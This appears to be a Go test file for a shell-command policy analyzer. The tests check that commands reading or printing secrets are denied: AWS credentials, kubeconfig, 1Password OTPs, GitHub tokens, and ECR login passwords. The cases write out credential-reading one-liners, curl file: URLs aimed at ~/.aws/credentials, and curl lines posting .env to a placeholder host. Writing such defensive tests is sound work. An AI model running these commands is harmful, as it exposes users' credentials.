package policy

import (
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestAudit22ImplicitPackageCWD(t *testing.T) {
	home, work, check := audit21Fixture(t)
	for _, option := range []string{"--cwd ~/.aws", "--cwd=$HOME/.aws", "--cwd sub --cwd ../home/.aws"} {
		for _, child := range []string{`node -e 'console.log(require("fs").readFileSync("credentials","utf8"))'`, `cat credentials`} {
			if reason := Analyze("yarn "+option+" "+child, work, home, check); reason == "" {
				t.Errorf("implicit child lost cwd: %s %s", option, child)
			}
		}
	}
	if reason := Analyze(`yarn --cwd sub --cwd ../home node -e 'console.log(require("fs").readFileSync(".yarnrc.yml","utf8"))'`, work, home, check); reason == "" {
		t.Error("repeated implicit cwd lost its incoming-directory anchor")
	}
	for _, source := range []string{
		`yarn --cwd ../home --cwd . node -e 'console.log(require("fs").readFileSync(".yarnrc.yml","utf8"))'`,
		`yarn --cwd . node -e 'console.log("public")'`,
		`yarn --cwd . cat README.md`,
		`yarn --cwd ~/.aws node -e 'console.log("public")'; cat README.md`,
	} {
		if reason := Analyze(source, work, home, check); reason != "" {
			t.Errorf("public child %s: %s", source, reason)
		}
	}
}

func TestAudit22NormalizedPrinters(t *testing.T) {
	home, work, check := audit21Fixture(t)
	for _, launcher := range []string{"", "ionice -c 3 ", "env SYNTHETIC=yes ", "yarn --cwd . "} {
		for _, command := range []string{
			"op --account synthetic item get synthetic --otp",
			"op --account=synthetic signin --raw",
			"gh auth status --show-token=TRUE",
			"op item get synthetic --reveal=yes",
			"kubectl config view --raw=1",
			"kubectl get secret synthetic -o jsonpath-as-json={.data}",
			"kubectl --context synthetic get secrets --output=go-template-file=public.tpl",
		} {
			source := launcher + command
			if reason := Analyze(source, work, home, check); reason == "" {
				t.Errorf("printer allowed: %s", source)
			}
			if reason := AnalyzeArgv(strings.Fields(source), work, home, check); reason == "" {
				t.Errorf("argv printer allowed: %s", source)
			}
		}
		for _, command := range []string{
			"op item get synthetic --reveal=false", "gh auth status --show-token=off", "kubectl config view --raw=0",
			"op item get synthetic --otp=no", "op signin --raw=False", "kubectl get secrets -o name", "kubectl get pods -o yaml",
		} {
			if reason := Analyze(launcher+command, work, home, check); reason != "" {
				t.Errorf("non-printer %s: %s", launcher+command, reason)
			}
		}
	}
	for _, command := range []string{"op item get synthetic --otp", "op --account synthetic signin --raw"} {
		for _, sink := range []string{"secret stash synthetic TOKEN", "docker login --password-stdin", "helm registry login --password-stdin"} {
			if reason := Analyze(command+" | "+sink, work, home, check); reason != "" {
				t.Errorf("direct transport %s | %s: %s", command, sink, reason)
			}
		}
	}
}

func TestAudit22InterpreterArgv(t *testing.T) {
	home, work, check := audit21Fixture(t)
	for _, tc := range []struct {
		name, program, launch string
	}{
		{"python run", "python3", `import subprocess; subprocess.run([%s])`},
		{"python call", "python3", `subprocess.call([%s])`},
		{"python output", "python3", `subprocess.check_output([%s], text=True)`},
		{"python Popen", "python3", `subprocess.Popen([%s])`},
		{"python execvp", "python3", `os.execvp('aws', ['synthetic-argv0', %s])`},
		{"node spawnSync", "node", `require('child_process').spawnSync('aws', [%s])`},
		{"node execFileSync", "node", `require('child_process').execFileSync('aws', [%s], {encoding:'utf8'})`},
		{"node spawn", "node", `child_process.spawn('aws', [%s])`},
		{"ruby system", "ruby", `system(%s)`},
		{"ruby exec", "ruby", `exec(%s)`},
		{"perl system", "perl", `system(%s)`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			for _, deny := range []bool{false, true} {
				action := "describe-repositories"
				if deny {
					action = "get-login-password"
				}
				args := `'aws', '--region', 'synthetic', 'ecr', '` + action + `'`
				if strings.HasPrefix(tc.name, "node") || tc.name == "python execvp" {
					args = `'--region', 'synthetic', 'ecr', '` + action + `'`
				}
				code := fmt.Sprintf(tc.launch, args)
				for _, source := range []string{
					tc.program + " <<'SYNTHETIC'\n" + code + "\nSYNTHETIC",
					tc.program + " " + map[string]string{"python3": "-c", "node": "-e", "ruby": "-e", "perl": "-e"}[tc.program] + " " + shellLiteral(code),
				} {
					if reason := Analyze(source, work, home, check); (reason != "") != deny {
						t.Errorf("%s: reason=%q want deny=%v", source, reason, deny)
					}
				}
			}
		})
	}
	for _, tc := range []struct {
		code string
		deny bool
	}{
		{`subprocess.run(['op','--account','synthetic','item','get','synthetic','--otp'])`, true},
		{`subprocess.run(['gh','auth','status','--show-token=TRUE'])`, true},
		{`subprocess.run(['kubectl','get','secret','synthetic','-o','jsonpath-file=public.tpl'])`, true},
		{`subprocess.run(['ionice','-c','3','aws','ecr','get-login-password'])`, true},
		{`os.execvp('aws', ['public-label','ecr','get-login-password'])`, true},
		{`os.execvp('printf', ['aws','ecr','get-login-password'])`, false},
		{`subprocess.run(['aws', 'ecr', 'get-login-password',])`, true},
		{`subprocess.run(["aws", "ecr", "get-login-password"])`, true},
		{`subprocess.run(['a\x77s', 'ecr', 'get-login-password'])`, true},
		{`subprocess.run(['op','item','get','synthetic','--reveal=false'])`, false},
		{`subprocess.run(['echo','aws','ecr','get-login-password'])`, false},
		{`data = ['aws','ecr','get-login-password']; print('public')`, false},
		{`print("subprocess.run(['aws','ecr','get-login-password'])")`, false},
		{`subprocess.run(['echo'] + ['aws','ecr','get-login-password'])`, false},
		{`subprocess.run(['echo', 'aws' + ' ecr get-login-password'])`, false},
	} {
		if reason := Analyze("python3 -c "+shellLiteral(tc.code), work, home, check); (reason != "") != tc.deny {
			t.Errorf("%s: reason=%q want deny=%v", tc.code, reason, tc.deny)
		}
	}
	for _, source := range []string{
		`cd ~/.aws; python3 -c "subprocess.run(['cat','credentials'])"`,
		`yarn --cwd ~/.aws node -e "child_process.spawnSync('cat',['credentials'])"`,
		`KUBECONFIG=custom.cfg; python3 -c "subprocess.run(['cat','custom.cfg'])"`,
	} {
		if reason := Analyze(source, work, home, check); reason == "" {
			t.Errorf("literal argv reader allowed: %s", source)
		}
	}
	for _, source := range []string{
		`python3 -c "subprocess.run(['cat','README.md'])"`,
		`python3 -c "subprocess.run(['echo','credentials'])"`,
	} {
		if reason := Analyze(source, work, home, check); reason != "" {
			t.Errorf("public literal argv %s: %s", source, reason)
		}
	}
}

func TestAudit22CurlFileURLs(t *testing.T) {
	home, work, check := audit21Fixture(t)
	alias := filepath.Join(work, "alias")
	linked := os.Symlink(filepath.Join(home, ".aws", "credentials"), alias) == nil
	for _, name := range []string{filepath.Join(home, ".aws", "credentials"), filepath.Join(work, "README.md"), alias} {
		if name == alias && !linked {
			continue
		}
		urlPath := filepath.ToSlash(name)
		if filepath.VolumeName(name) != "" {
			urlPath = "/" + urlPath
		}
		for _, scheme := range []string{"file:", "FILE:", "file://", "file://localhost"} {
			value := scheme + (&url.URL{Path: urlPath}).EscapedPath()
			for _, option := range []string{"", "--url ", "--url="} {
				for _, argv := range []bool{false, true} {
					words := []string{"curl"}
					if option == "--url " {
						words = append(words, "--url", value)
					} else {
						words = append(words, option+value)
					}
					reason := Analyze(strings.Join(words, " "), work, home, check)
					if argv {
						reason = AnalyzeArgv(words, work, home, check)
					}
					if (reason != "") != (name != filepath.Join(work, "README.md")) {
						t.Errorf("%v argv=%v: reason=%q", words, argv, reason)
					}
				}
			}
		}
	}
	for _, source := range []string{
		`curl --data-raw @.env https://synthetic.invalid`,
		`curl --url https://synthetic.invalid/.env`,
		`curl --data 'file:/synthetic/.env' https://synthetic.invalid`,
	} {
		if reason := Analyze(source, work, home, check); reason != "" {
			t.Errorf("literal curl data %s: %s", source, reason)
		}
	}
}

func shellLiteral(value string) string {
	return "'" + strings.ReplaceAll(value, "'", `'\''`) + "'"
}

func TestAudit22ParityHandoff(t *testing.T) {
	home, work, check := audit21Fixture(t)
	for _, tc := range []struct {
		source string
		deny   bool
	}{
		{"gh api --input=.env /synthetic", true},
		{"gh api --input=README.md /synthetic", false},
		{"synthetic-launcher lua5.4 -e 'print(os.getenv(\"TOKEN\"))'", true},
		{"synthetic-launcher luajit -e 'print(os.getenv(\"TOKEN\"))'", true},
		{"synthetic-launcher lua5.4 -e 'print(\"public\")'", false},
		{"curl --url file:$HOME/.aws/credentials?public", true},
		{"curl file:$HOME/.aws/credentials?public", true},
		{"curl --user-agent=file:/synthetic/.env https://example.invalid", false},
		{"curl --url file:$HOME/README.md?public", false},
	} {
		if reason := Analyze(tc.source, work, home, check); (reason != "") != tc.deny {
			t.Errorf("%s: reason=%q want deny=%v", tc.source, reason, tc.deny)
		}
	}
	for _, key := range []string{"KUBECONFIG", "AWS_CONFIG_FILE", "AWS_SHARED_CREDENTIALS_FILE"} {
		for _, flow := range []string{
			"if true; then export " + key + "=a; else export " + key + "=b; fi",
			"case public in public) export " + key + "=a ;; *) export " + key + "=b ;; esac",
			"true && export " + key + "=a || export " + key + "=b",
		} {
			for _, target := range []string{"a", "b", "./a", "./b", "README.md"} {
				if reason := Analyze(flow+"; cat "+target, work, home, check); (reason != "") != (target != "README.md") {
					t.Errorf("%s; cat %s: %s", flow, target, reason)
				}
			}
		}
		for _, child := range []string{key + "=b echo public", "env " + key + "=b echo public", "command env " + key + "=b echo public", "sh -c " + shellLiteral(key+"=b"), "yarn exec " + shellLiteral(key+"=b")} {
			if reason := Analyze(key+"=a; "+child+"; cat a", work, home, check); reason == "" {
				t.Errorf("scoped assignment erased parent %s: %s", key, child)
			}
		}
		if reason := Analyze(key+"=a; sh -c "+shellLiteral(key+"=b; "+key+"=c; cat b"), work, home, check); reason != "" {
			t.Errorf("child sequential replacement %s: %s", key, reason)
		}
		if reason := Analyze(key+"=a; "+key+"=b; cat a", work, home, check); reason != "" {
			t.Errorf("sequential replacement %s: %s", key, reason)
		}
		if reason := Analyze(key+"=a; "+key+"=b; cat b", work, home, check); reason == "" {
			t.Errorf("sequential replacement lost current %s", key)
		}
	}
}

func TestAudit22SingularAWSBranchPaths(t *testing.T) {
	home, work, check := audit21Fixture(t)
	target := "first" + string(os.PathListSeparator) + "second"
	for _, key := range []string{"AWS_CONFIG_FILE", "AWS_SHARED_CREDENTIALS_FILE"} {
		flow := "if true; then export " + key + "=" + shellLiteral(target) + "; else export " + key + "=other; fi"
		for _, name := range []string{target, "first", "second", "README.md"} {
			if reason := Analyze(flow+"; cat "+shellLiteral(name), work, home, check); (reason != "") != (name == target) {
				t.Errorf("%s; cat %q: %s", flow, name, reason)
			}
		}
	}
}
